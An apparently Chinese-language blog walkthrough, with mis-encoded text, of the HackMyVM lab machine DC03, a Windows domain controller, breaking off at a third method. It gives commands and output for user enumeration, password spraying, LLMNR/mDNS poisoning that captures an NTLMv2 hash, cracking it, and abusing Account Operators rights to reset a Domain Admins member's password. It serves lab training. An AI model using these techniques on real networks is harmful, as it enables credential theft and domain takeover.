---
title: HMV-DC03
description: 'Something realistic i think. U tell me.'
pubDate: 2025-12-08
image: /machine/DC03.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Windows Machine
---

åŒæ ·å¼€å±€æŠ¥é”™ä¿®æ”¹åå­—

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765183157962-97405ad9-3f3d-40e9-badc-8ef03027f70d.png)

# ä¿¡æ¯æ”¶é›†
## ç¡®å®šIP
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# arp-scan -l | grep "08:00:27" | awk '{print $1}'                                    
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
172.16.55.212   
```

## Nmap
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -Pn -sTCV -T4 172.16.55.212                                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-08 03:40 EST
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.93% done; ETC: 03:41 (0:00:00 remaining)
Nmap scan report for 172.16.55.212
Host is up (0.00037s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-08 23:41:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:af:d1:44 (Oracle VirtualBox virtual NIC)
|_clock-skew: 14h59m57s
| smb2-time: 
|   date: 2025-12-08T23:41:12
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.38 seconds

```

```c
172.16.55.212 SOUPEDECODE.LOCAL
```

## SMBæšä¸¾
ç”±äº445ç«¯å£å¼€æ”¾smbæœåŠ¡å°è¯•è¿›è¡Œæšä¸¾

### enum4linux
`enum4linux`ä¸“é—¨ç”¨äº **æšä¸¾ SMB / RPC æœåŠ¡çš„ Windows ä¸»æœº**

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/tools/ldapnomnom]
â””â”€# enum4linux -u  -p  -a 172.16.55.212 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec  8 03:57:12 2025

 =========================================( Target Information )=========================================
                                                                                                                                                           
Target ........... 172.16.55.212                                                                                                                           
RID Range ........ 500-550,1000-1050
Username ......... '-p'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 172.16.55.212 )===========================
                                                                                                                                                           
                                                                                                                                                           
[+] Got domain/workgroup name: SOUPEDECODE                                                                                                                 
                                                                                                                                                           
                                                                                                                                                           
 ===============================( Nbtstat Information for 172.16.55.212 )===============================
                                                                                                                                                           
Looking up status of 172.16.55.212                                                                                                                         
        DC01            <00> -         B <ACTIVE>  Workstation Service
        SOUPEDECODE     <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        SOUPEDECODE     <1c> - <GROUP> B <ACTIVE>  Domain Controllers
        DC01            <20> -         B <ACTIVE>  File Server Service
        SOUPEDECODE     <1b> -         B <ACTIVE>  Domain Master Browser

        MAC Address = 08-00-27-AF-D1-44

 ===================================( Session Check on 172.16.55.212 )===================================
                                                                                                                                                           
                                                                                                                                                           
[E] Server doesn't allow session using username '-p', password ''.  Aborting remainder of tests.     
```

### smbåŒ¿åè®¿é—®
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/tools/ldapnomnom]
â””â”€# netexec smb 172.16.55.212  -u "" -p "" --shares
SMB         172.16.55.212   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)                                                                                                                                                       
SMB         172.16.55.212   445    DC01             [-] SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED 
SMB         172.16.55.212   445    DC01             [-] Error enumerating shares: Error occurs while reading from remote(104)
```

## åŸŸç”¨æˆ·æšä¸¾
 æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ï¼Œè¿›è¡ŒåŸŸç”¨æˆ·æšä¸¾ï¼Œä½¿ç”¨`kerbrute`

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/tools/kerbrute]
â””â”€# ./kerbrute userenum -d SOUPEDECODE.LOCAL --dc 172.16.55.212 /home/kali/Desktop/wordlists/self/user.txt 2>&1 \
| sed -n 's/\x1b\[[0-9;]*m//g; /VALID USERNAME/ {s/.*VALID USERNAME: *//; s/@.*//; s/^[ \t]*//; s/[ \t\r]*$//; p}' > user.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/tools/kerbrute]
â””â”€# cat user.txt  
Administrator
charlie        
```

## å¯†ç å–·æ´’
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/tools/kerbrute]
â””â”€# netexec smb 172.16.55.212 -u user.txt -p user.txt
SMB         172.16.55.212   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)                                                                                                                                                       
SMB         172.16.55.212   445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         172.16.55.212   445    DC01             [-] SOUPEDECODE.LOCAL\charlie:Administrator STATUS_LOGON_FAILURE 
SMB         172.16.55.212   445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:charlie STATUS_LOGON_FAILURE 
SMB         172.16.55.212   445    DC01             [-] SOUPEDECODE.LOCAL\charlie:charlie STATUS_LOGON_FAILURE 
```

```bash
crackmapexec smb 172.16.55.212  -u user.txt -p user.txt --continue-on-success --no-bruteforce
```

æ²¡æœ‰å¼±å¯†ç å­˜åœ¨

# wiresharkæŠ“åŒ…
ip.addr == 172.16.55.212

![](https://cdn.nlark.com/yuque/0/2025/png/40628873/1765185479076-bd172f3c-6b45-44ab-af3f-519554213da4.png)

## ğŸŒ ä»€ä¹ˆæ˜¯ mDNSï¼Ÿ
**mDNS = Multicast DNS**  
ç«¯å£ **UDP 5353**  
ä¸»è¦ç”¨äº **å±€åŸŸç½‘è®¾å¤‡çš„è‡ªåŠ¨å‘ç°**ï¼ˆç‰¹åˆ«æ˜¯è‹¹æœç”Ÿæ€ï¼‰ã€‚

çœ‹è§å­˜åœ¨é¶æœºåœ¨å‘é€`MDNS`è¯·æ±‚

`172.16.55.212` æ­£åœ¨å‘é€ `mDNS` æŸ¥è¯¢ï¼Œä¾‹å¦‚ `A FileServer.local`ï¼Œ è¿™è¡¨æ˜é¶æœºä¸€ç›´åœ¨è¯·æ±‚`FileServer` çš„åŸŸå  



# LLMNR æŠ•æ¯’
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# responder -I eth0 -wd
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
  
[+] Listening for events...                                                                                                                                

[*] [DHCP] Found DHCP server IP: 172.16.52.1, now waiting for incoming requests...
[*] [DHCP] Found DHCP server IP: 172.16.52.1, now waiting for incoming requests...
[*] [NBT-NS] Poisoned answer sent to 172.16.55.212 for name FILESERVER (service: File Server)
[*] [MDNS] Poisoned answer sent to 172.16.55.212   for name FileServer.local
[*] [MDNS] Poisoned answer sent to fe80::8823:c086:cae3:8330 for name FileServer.local
[*] [MDNS] Poisoned answer sent to 172.16.55.212   for name FileServer.local
[*] [LLMNR]  Poisoned answer sent to fe80::8823:c086:cae3:8330 for name FileServer
[*] [LLMNR]  Poisoned answer sent to 172.16.55.212 for name FileServer
[*] [MDNS] Poisoned answer sent to fe80::8823:c086:cae3:8330 for name FileServer.local
[*] [LLMNR]  Poisoned answer sent to fe80::8823:c086:cae3:8330 for name FileServer
[*] [LLMNR]  Poisoned answer sent to 172.16.55.212 for name FileServer
[SMB] NTLMv2-SSP Client   : fe80::8823:c086:cae3:8330
[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:6dd0e7fdf60bf255:F7C0EE2E94C9C4299D6135E5B8FE237B:0101000000000000804A6792FA67DC017256D884783028F00000000002000800500057004E00570001001E00570049004E002D0059004C0054004C005A004800360050004B003900420004003400570049004E002D0059004C0054004C005A004800360050004B00390042002E00500057004E0057002E004C004F00430041004C0003001400500057004E0057002E004C004F00430041004C0005001400500057004E0057002E004C004F00430041004C0007000800804A6792FA67DC01060004000200000008003000300000000000000000000000004000000DF192F368B1313FC0827840A4C4153DF97E8B115002F1F9A91223A6381CCBC10A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000                                                   
[*] [MDNS] Poisoned answer sent to 172.16.55.179   for name wpad.local
[*] [MDNS] Poisoned answer sent to 172.16.55.179   for name wpad.local
[*] [MDNS] Poisoned answer sent to fe80::afa5:9700:ef8a:d874 for name wpad.local
[*] [MDNS] Poisoned answer sent to fe80::afa5:9700:ef8a:d874 for name wpad.local
[*] [MDNS] Poisoned answer sent to 172.16.55.179   for name wpad.local
[*] [LLMNR]  Poisoned answer sent to fe80::afa5:9700:ef8a:d874 for name wpad
[*] [MDNS] Poisoned answer sent to fe80::afa5:9700:ef8a:d874 for name wpad.local
[*] [MDNS] Poisoned answer sent to 172.16.55.179   for name wpad.local
[*] [LLMNR]  Poisoned answer sent to fe80::afa5:9700:ef8a:d874 for name wpad
[*] [LLMNR]  Poisoned answer sent to 172.16.55.179 for name wpad
[*] [MDNS] Poisoned answer sent to fe80::afa5:9700:ef8a:d874 for name wpad.local
[*] [LLMNR]  Poisoned answer sent to 172.16.55.179 for name wpad
[*] [LLMNR]  Poisoned answer sent to fe80::afa5:9700:ef8a:d874 for name wpad
[*] [LLMNR]  Poisoned answer sent to fe80::afa5:9700:ef8a:d874 for name wpad

```

```c
[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:6dd0e7fdf60bf255:F7C0EE2E94C9C4299D6135E5B8FE237B:0101000000000000804A6792FA67DC017256D884783028F00000000002000800500057004E00570001001E00570049004E002D0059004C0054004C005A004800360050004B003900420004003400570049004E002D0059004C0054004C005A004800360050004B00390042002E00500057004E0057002E004C004F00430041004C0003001400500057004E0057002E004C004F00430041004C0005001400500057004E0057002E004C004F00430041004C0007000800804A6792FA67DC01060004000200000008003000300000000000000000000000004000000DF192F368B1313FC0827840A4C4153DF97E8B115002F1F9A91223A6381CCBC10A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000 
```

## hashcatç ´è§£
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv/DC03]
â””â”€# hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
XKATE578::soupedecode:6dd0e7fdf60bf255:f7c0ee2e94c9c4299d6135e5b8fe237b:0101000000000000804a6792fa67dc017256d884783028f00000000002000800500057004e00570001001e00570049004e002d0059004c0054004c005a004800360050004b003900420004003400570049004e002d0059004c0054004c005a004800360050004b00390042002e00500057004e0057002e004c004f00430041004c0003001400500057004e0057002e004c004f00430041004c0005001400500057004e0057002e004c004f00430041004c0007000800804a6792fa67dc01060004000200000008003000300000000000000000000000004000000df192f368b1313fc0827840a4c4153df97e8b115002f1f9a91223a6381ccbc10a0010000000000000000000000000000000000009001e0063006900660073002f00460069006c0065005300650072007600650072000000000000000000:jesuschrist
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: XKATE578::soupedecode:6dd0e7fdf60bf255:f7c0ee2e94c9...000000
Time.Started.....: Mon Dec  8 04:29:59 2025 (0 secs)
Time.Estimated...: Mon Dec  8 04:29:59 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   574.8 kH/s (0.92ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 24%

Started: Mon Dec  8 04:29:40 2025
Stopped: Mon Dec  8 04:30:01 2025

```

ç ´è§£å‡ºæ¥çš„å¯†ç ä¸ºjesuschrist

å¾—åˆ°ä¸€å¯¹è´¦å·`xkate578:jesuschrist`

# äºŒæ¬¡ä¿¡æ¯æ”¶é›†
## æå–ç”¨æˆ·
```c
enum4linux -u'xkate578' -p 'jesuschrist' -a 172.16.55.212 > enum
```

```plain
grep -Po 'user:\[\K[^\]]+' enum > user.txt
```

## smbæœåŠ¡æ¢æµ‹
```c
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03]
â””â”€$ smbmap -H $IP -u xkate578 -p jesuschrist

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.10.107:445      Name: 192.168.10.107            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        share                                                   READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```

å‘ç°å­˜åœ¨ä¸€ä¸ªå¯å†™å…±äº«ç›®å½•ï¼Œå°è¯•çœ‹ä¸€ä¸‹ï¼š

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv/DC03]
â””â”€# smbclient -U SOUPEDECODE.LOCAL/xkate578 //172.16.55.212/share 

Password for [SOUPEDECODE.LOCAL\xkate578]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Mon Dec  8 21:00:20 2025
  ..                                  D        0  Thu Aug  1 01:38:08 2024
  desktop.ini                       AHS      282  Thu Aug  1 01:38:08 2024
  user.txt                            A       70  Thu Aug  1 01:39:25 2024

                12942591 blocks of size 4096. 10927654 blocks available
smb: \> type user.txt
type: command not found
smb: \> get user.txt
getting file \user.txt of size 70 as user.txt (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
smb: \> cd ../
smb: \> ls
  .                                  DR        0  Mon Dec  8 21:00:20 2025
  ..                                  D        0  Thu Aug  1 01:38:08 2024
  desktop.ini                       AHS      282  Thu Aug  1 01:38:08 2024
  user.txt                            A       70  Thu Aug  1 01:39:25 2024

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv/DC03]
â””â”€# cat user.txt 
ï¿½ï¿½12f54a96f64443246930da001cafda8b                                   
```

## æŸ¥çœ‹ä¿¡æ¯
### pywerview
Pywerview = **PowerView çš„ Python ç‰ˆæœ¬**  
ï¼ˆPowerView æ˜¯ PowerSploit ä¸­æœ€å¼ºçš„ Active Directory æšä¸¾å·¥å…·ï¼‰

ç”±äº PowerView è¿è¡Œåœ¨ Windows + PowerShell ä¸Šï¼Œè€Œ Linux æ¸—é€æ›´ä¹ æƒ¯åœ¨ Kali æ“ä½œï¼Œæ‰€ä»¥ Pywerview çš„æ„ä¹‰æ˜¯ï¼š

ğŸ‘‰ **ä½ å¯ä»¥åœ¨ Linux ä¸Šå®Œæˆå¤§é‡ PowerView çš„åŠŸèƒ½ï¼Œä¸ç”¨ PowerShellã€ä¸ç”¨ Windowsã€ä¸ç”¨åŸŸå†…æœºå™¨ã€‚**

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/tools]
â””â”€$ pywerview get-netuser -w soupedecode.local --dc-ip 172.16.55.212 -u xkate578 -p jesuschrist --username xkate578
objectclass:           top, person, organizationalPerson, user
cn:                    Xenia Kate
sn:                    Kate
l:                     Springfield
st:                    NY
title:                 Analyst
description:           Adventure seeker and extreme sports fan
postalcode:            81335
telephonenumber:       719-5053
givenname:             Xenia
initials:              XK
distinguishedname:     CN=Xenia Kate,CN=Users,DC=SOUPEDECODE,DC=LOCAL
instancetype:          4
whencreated:           2024-06-15 20:04:39+00:00
whenchanged:           2025-12-09 00:25:01+00:00
displayname:           Xenia Kate
usncreated:            16902
memberof:              CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL
usnchanged:            40990
department:            Sales
company:               CompanyC
streetaddress:         123 Elm St
name:                  Xenia Kate
objectguid:            {f5dee86d-8f4e-4591-8446-0250d6e4bf92}
useraccountcontrol:    NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
badpwdcount:           0
codepage:              0
countrycode:           0
badpasswordtime:       2025-12-09 02:02:22.762611+00:00
lastlogoff:            1601-01-01 00:00:00+00:00
lastlogon:             2025-12-09 02:02:25.090216+00:00
logonhours:            ffffffffffffffffffffffffffffffffffffffffff...
pwdlastset:            2024-08-01 05:37:18.874022+00:00
primarygroupid:        513
objectsid:             S-1-5-21-2986980474-46765180-2505414164-1182
admincount:            1
accountexpires:        1601-01-01 00:00:00+00:00
logoncount:            6
samaccountname:        xkate578
samaccounttype:        805306368
userprincipalname:     xkate578@soupedecode.local
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL
dscorepropagationdata: 2024-08-01 05:47:50+00:00, 1601-01-01 00:00:00+00:00
lastlogontimestamp:    2025-12-09 00:25:01.958200+00:00
mail:                  xkate578@soupedecode.local 
```

 ä»`memberof: CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL` ä¸­å¯ä»¥çœ‹åˆ°ç”¨æˆ·å±äº`Account Operators` ç»„  

### ldapdomaindump 
ä½¿ç”¨`ldapdomaindump `å·¥å…·è¿›è¡Œä¿¡æ¯æœé›†ï¼š

| ```plain â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03] â””â”€$ mkdir domain  â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03/domain] â””â”€$ ldapdomaindump $IP -u 'SOUPEDECODE.LOCAL\xkate578' -p jesuschrist [*] Connecting to host... [*] Binding to host [+] Bind OK [*] Starting domain dump [+] Domain dump finished  â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03/domain] â””â”€$ grep -Pnir xkate578                                domain_users.json:54297:            "xkate578@soupedecode.local" domain_users.json:54330:            "xkate578" domain_users.json:54360:            "xkate578@soupedecode.local" domain_users_by_group.html:449:<tr><td>Xenia Kate</td><td>Xenia Kate</td><td>xkate578</td><td>06/15/24 20:04:39</td><td>06/13/25 16:04:01</td><td>06/13/25 16:04:01</td><td>NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD</td><td>08/01/24 05:37:18</td><td><abbr title="S-1-5-21-2986980474-46765180-2505414164-1182">1182</abbr></td><td>Adventure seeker and extreme sports fan</td></tr> domain_users_by_group.html:999:<tr><td>Xenia Kate</td><td>Xenia Kate</td><td>xkate578</td><td>06/15/24 20:04:39</td><td>06/13/25 16:04:01</td><td>06/13/25 16:04:01</td><td>NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD</td><td>08/01/24 05:37:18</td><td><abbr title="S-1-5-21-2986980474-46765180-2505414164-1182">1182</abbr></td><td>Adventure seeker and extreme sports fan</td></tr> domain_users.html:449:<tr><td>Xenia Kate</td><td>Xenia Kate</td><td>xkate578</td><td><a href="domain_users_by_group.html#cn_Account_Operators" title="CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL">Account Operators</a></td><td><a href="domain_users_by_group.html#cn_Domain_Users" title="CN=Domain Users,CN=Users,DC=SOUPEDECODE,DC=LOCAL">Domain Users</a></td><td>06/15/24 20:04:39</td><td>06/13/25 16:04:01</td><td>06/13/25 16:04:01</td><td>NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD</td><td>08/01/24 05:37:18</td><td><abbr title="S-1-5-21-2986980474-46765180-2505414164-1182">1182</abbr></td><td>Adventure seeker and extreme sports fan</td></tr> domain_users.grep:419:Xenia Kate        Xenia Kate      xkate578        Account Operators       Domain Users    06/15/24 20:04:39       06/13/25 16:04:01       06/13/25 16:04:01       NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD   08/01/24 05:37:18       S-1-5-21-2986980474-46765180-2505414164-1182    Adventure seeker and extreme sports fan ```  |
| --- |


+ Account Operators æ˜¯ Active Directory (AD) ä¸­çš„ä¸€ä¸ª**æœ¬åœ°åŸŸç»„**ï¼Œå…¶æƒé™è®¾è®¡ç”¨äºç®¡ç†åŸŸå†…çš„ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœºè´¦æˆ·ï¼Œä½†æƒé™èŒƒå›´å­˜åœ¨ç‰¹å®šé™åˆ¶ã€‚
+ å¯ä»¥æ›´æ”¹æˆå‘˜çš„å¯†ç ï¼ï¼ï¼
+ **ç›´æ¥éš¶å±ç»„**ï¼š`Account Operators`ï¼ˆè´¦æˆ·æ“ä½œå‘˜ï¼‰å’Œ `Domain Users`ï¼ˆåŸŸç”¨æˆ·ï¼‰
+ Account Operators ç»„çš„é»˜è®¤æƒé™ï¼š
    - è´¦æˆ·ç®¡ç†ï¼šåˆ›å»ºã€åˆ é™¤ç”¨æˆ·å’Œè®¡ç®—æœºè´¦æˆ·ï¼Œé‡ç½®å¯†ç ï¼ˆéœ€åŸå§‹å¯†ç ï¼‰
    - å±æ€§ä¿®æ”¹ï¼šä¿®æ”¹ç”¨æˆ·æè¿°ã€ç»„æˆå‘˜å…³ç³»ç­‰ï¼Œä½†æ— æ³•ä¿®æ”¹åŸŸç®¡ç†å‘˜ç»„ï¼ˆDomain Adminsï¼‰æˆ–ç®¡ç†å‘˜ç»„ï¼ˆAdministratorsï¼‰çš„æˆå‘˜
    - æœ¬åœ°ç™»å½•æƒé™ï¼šå¯åœ¨åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼‰ä¸Šæœ¬åœ°ç™»å½•

## ææƒ
æˆ‘ä»¬æ˜¯`Account Operators` ç»„çš„æˆå‘˜ï¼Œæ‹¥æœ‰**å‘ç”¨æˆ·æˆäºˆæœ‰é™çš„å¸æˆ·åˆ›å»ºæƒé™**

å¯ä»¥ä¿®æ”¹å¤§å¤šæ•°ç±»å‹çš„è´¦æˆ·ï¼Œå¯ä»¥ç®¡ç†æœ¬åœ°ç”¨æˆ·å’Œç»„ï¼Œä½†ä¸å…·å¤‡ä¿®æ”¹ç®¡ç†å‘˜ç»„æˆ–å…¨å±€ç»„æˆå‘˜èº«ä»½çš„æƒé™

ç°åœ¨æ˜¯è¦å¯»æ‰¾

åˆ—å‡ºç®¡ç†ç»„çš„æˆå‘˜ï¼Œå¯ä»¥çœ‹åˆ°æˆå‘˜åŒ…æ‹¬ä¸€ä¸ªç»„`Operators` å’Œ`administrator` ç”¨æˆ·

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/tools]
â””â”€$ pywerview get-netgroupmember -w soupedecode.local --dc-ip 172.16.55.212 -u xkate578 -p jesuschrist --group "Domain Admins"
groupdomain:  SOUPEDECODE.LOCAL
groupname:    Domain Admins
membername:   Operators
memberdomain: SOUPEDECODE.LOCAL
isgroup:      True
memberdn:     CN=Operators,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectsid:    S-1-5-21-2986980474-46765180-2505414164-2165 

groupdomain:  SOUPEDECODE.LOCAL
groupname:    Domain Admins
membername:   Administrator
memberdomain: SOUPEDECODE.LOCAL
isgroup:      False
memberdn:     CN=Administrator,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectsid:    S-1-5-21-2986980474-46765180-2505414164-500 
```

è·Ÿè¿›`Operators` ï¼Œèƒ½å‘ç°å­˜åœ¨ `fbeth103` ã€‚

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop/tools]
â””â”€$ pywerview get-netgroupmember -w soupedecode.local --dc-ip 172.16.55.212 -u xkate578 -p jesuschrist --group "Operators"    
groupdomain:  SOUPEDECODE.LOCAL
groupname:    Operators
membername:   fbeth103
memberdomain: SOUPEDECODE.LOCAL
isgroup:      False
memberdn:     CN=Fanny Beth,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectsid:    S-1-5-21-2986980474-46765180-2505414164-1221 
```

ç„¶å`fbeth103` å±äº`Operators` ç»„ï¼Œè€Œ`Operators` åˆå±äº`Domain Admins`ç»„ï¼Œé‚£ä¹ˆ`fbeth103` å°±æ‹¥æœ‰`Domain Admins`ç»„çš„æƒé™ã€‚

`Account Operators` ç»„èƒ½å¤Ÿä¿®æ”¹ `fbeth103` ç”¨æˆ·çš„è´¦æˆ·ä¿¡æ¯ï¼Œå³ä½¿ `fbeth103` å±äº `Operators` ç»„ï¼Œè€Œ `Operators` ç»„åˆæ˜¯ `Domain Admins` ç»„çš„æˆå‘˜

###  ä¿®æ”¹`fbeth103` çš„å¯†ç   
#### æ–¹æ³•ä¸€ï¼šimpacket-changepasswd
| ```plain â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03/domain] â””â”€$ impacket-changepasswd 'soupedecode/fbeth103'@172.16.55.212 -altuser xkate578 -altpass jesuschrist -newpass hacked -no-pass -reset          Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies   [*] Setting the password of soupedecode\fbeth103 as soupedecode\xkate578 [*] Connecting to DCE/RPC as soupedecode\xkate578 [-] soupedecode\xkate578 user is not allowed to set the password of the target ```  |
| --- |


æœªæˆåŠŸã€‚ã€‚ã€‚ã€‚é‡æ–°å¯¼å…¥é¶æœºï¼Œä¸ºæ‰€æœ‰ç½‘å¡ä¿®æ”¹macåœ°å€ï¼Œä¿®æ”¹åç§°ï¼Œå¯åŠ¨ï¼Œæ‰§è¡Œå‘½ä»¤ï¼ŒæˆåŠŸï¼

| ```plain â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03/domain] â””â”€$ impacket-changepasswd 'soupedecode/fbeth103'@172.16.55.212 -altuser xkate578 -altpass jesuschrist -newpass hacked -no-pass -reset  Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies   [*] Setting the password of soupedecode\fbeth103 as soupedecode\xkate578 [*] Connecting to DCE/RPC as soupedecode\xkate578 [*] Password was changed successfully. [!] User no longer has valid AES keys for Kerberos, until they change their password again. ```  |
| --- |


+ `-no-pass` ä¸éœ€è¦æä¾›åŸæ¥çš„å¯†ç 
+ `-reset`ç”Ÿæ•ˆ
+ å¼ºè¡Œé‡ç½®å¯†ç å¹¶ç”Ÿæ•ˆ

#### æ–¹æ³•äºŒï¼šbloodyAD
| ```plain â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC03/domain] â””â”€$ bloodyAD -d SUPEDECDE.LCAL --host 172.16.55.212 -u xkate578 -p jesuschrist set password fbeth103 heathcliff [+] Password changed successfully! ```  |
| --- |


#### æ–¹æ³•ä¸‰ï¼šrpclient
